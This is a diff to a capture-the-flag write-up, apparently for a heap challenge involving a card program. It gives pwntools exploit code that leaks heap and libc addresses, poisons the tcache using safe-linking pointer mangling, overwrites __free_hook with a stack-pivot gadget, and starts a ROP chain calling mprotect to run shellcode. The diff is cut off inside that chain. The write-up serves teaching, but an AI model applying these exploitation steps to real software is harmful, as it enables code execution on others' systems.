@@ -151,44 +151,45 @@ Nothing here, the function does proper checks. It just outputs the fields of a c
 
 
 ## Exploit
-Here is the exploit logic and comments. For the full file, see exploit.py
+#### Leaking the Heap's Base Address
+How do we do this?
+add_card does: malloc(0x28) for card struct, malloc(0x28) for string struct, malloc(input) for name string.
+rm_card frees card struct, string struct, then string itself.
+Let's use 0x28 as size for the name and then free the card.
 ```python
-#####################################
-# LEAK THE HEAP'S BASE ADDRESS!
-#####################################
-# How do we do this?
-# add_card does: malloc(0x28) for card struct, malloc(0x28) for string struct, malloc(input) for name string.
-# rm_card frees card struct, string struct, then string itself.
-# Let's use 0x28 as size for the name.
 a = add_card(0x28, 'red', 'a'*0x28)
-
-# After this free, the tcache bin will look like:
-# name string -> string struct -> card struct
 rm_card(a)
+```
 
-# Therefore, adding another card, our name string will take the 3rd element in the bin, the card struct.
-# The card struct's 3rd member is a pointer to its string struct and it is still there in memory.
-# We can leak it thanks to the fact that no null terminator is appended to our name string.
+After this free, the tcache bin will look like:
+name string -> string struct -> card struct
+Therefore, after adding another card, our new name string will take the 3rd element in the bin, the card struct.
+The card struct's 3rd member is a pointer to its string struct and it is still there in memory.
+We can leak it thanks to the fact that no null terminator is appended to our name string.
+
+```python
 b = add_card(0x28, 'red', 'b'*0x10)
 view_card(b)
 p.recvuntil('Card name: ')
 p.recv(0x10)
 heap_base = u64(p.recv(6) + b'\x00\x00') - 0x2d0
 log.info(f'Heap: {hex(heap_base)}')
+```
 
 
-#####################################
-# TAKE CONTROL OF THE TCACHE!
-#####################################
-# We need the heap address to be able to encrypt and decrypt the FD pointers of free tcache bins.
-# Let's take control of tcache_perthread_struct by allocating a chunk on it.
-# We cannot use 0x28 size for this or the program's mallocs will break everything.
+#### Taking Control of the Tcache
+We need the heap address to be able to encrypt and decrypt the FD pointers of free tcache bins.
+Let's take control of tcache_perthread_struct by using UAF to allocate a chunk on it.
+We cannot use 0x28 size for this or the program's other mallocs will break everything.
+
+```python
 def protect_ptr(heap_addr, ptr):
     return (heap_addr >> 12) ^ ptr
 
 tcache_fd = protect_ptr(heap_base, heap_base+0x10)
+ # need to add 2 to put the bin idx count to 2 or our added pointer wont be used
 c = add_card(0xf8, 'red', 'a')
-d = add_card(0xf8, 'red', 'ddddddd') # need to add 2 to put idx count to 2 or our added pointer wont be used
+d = add_card(0xf8, 'red', 'ddddddd')
 rm_card(d)
 rm_card(c)
 edit_name(c, p64(tcache_fd)) # d is lost forever lol rip
@@ -197,16 +198,17 @@ c = add_card(0xf8, 'red', 'ccccccccc') # same as c
 # allocate to the tcache struct and set the 0x100 bin to 7 (full)
 # This will be useful for leaking the libc address
 tcache_perthread_struct = add_card(0xf8, 'red', p16(0) + p16(2) + p16(0)*12 + p16(7))
+```
 
 
-#####################################
-# LEAK THE LIBC'S BASE ADDRESS!
-#####################################
-# this will go in the unsorted bin since the tcache is full. it now has pointers to libc
+#### Leaking Libc's Base Address
+The next free will go in the unsorted bin since we modified the tcache to be full. 
+Free unsorted bin chunks contain pointers to libc.
+Then we can modify the tcache to be empty, malloc again and we'll get the chunk from the unsorted bin.
+Here the missing null terminator comes into play once again to leak information.
+
+```python
 rm_card(c)
-
-# let's take c back. for this, we need to set the tcache bin to empty,
-# or it will try taking from there instead of the unsorted bin.
 edit_name(tcache_perthread_struct, p16(0) + p16(2) + p16(0)*12 + p16(0))
 
 # I cannot use the same size (0xf8) or it will trigger the exact match condition at malloc.c:3820
@@ -220,17 +222,17 @@ add_rsp_0x38 += libc_leak
 free_hook = libc_elf.sym['__free_hook']
 log.info(f'Libc: {hex(libc_leak)}')
 log.info(f'Free Hook: {hex(free_hook)}')
+```
 
 
-#####################################
-# RUNNING ARBITRARY INSTRUCTIONS!
-#####################################
-# Let's modify the tcache struct again, to get a chunk on free_hook
-# Modify free_hook to a gadget that simply adds 0x38 to RSP.
-# Then if we add a secret name and call free right after, the 0x38 gadget will make it so that the return address is right on top of the first 8 bytes of our secret name :)
-# So, the secret name ROP will call mprotect on the heap to make it executable.
-# Then, we jump to a shellcode we placed on it.
+#### Executing Arbitrary Instructions
+Let's modify the tcache struct again, to get a chunk on free_hook.
+Modify free_hook to a gadget that simply adds 0x38 to RSP.
+Then if we add a secret name and call free right after, the 0x38 gadget will make it so that the return address is right on top of the first 8 bytes of our secret name :)
+The secret name ROP will call mprotect on the heap to make it executable.
+Then we jump to a shellcode we place on the heap.
 
+```python
 # The ROP. mprotect is whitelisted by seccomp
 rop = ROP(libc_elf)
 rop.call('mprotect',  [heap_base, 0x1000, 7])
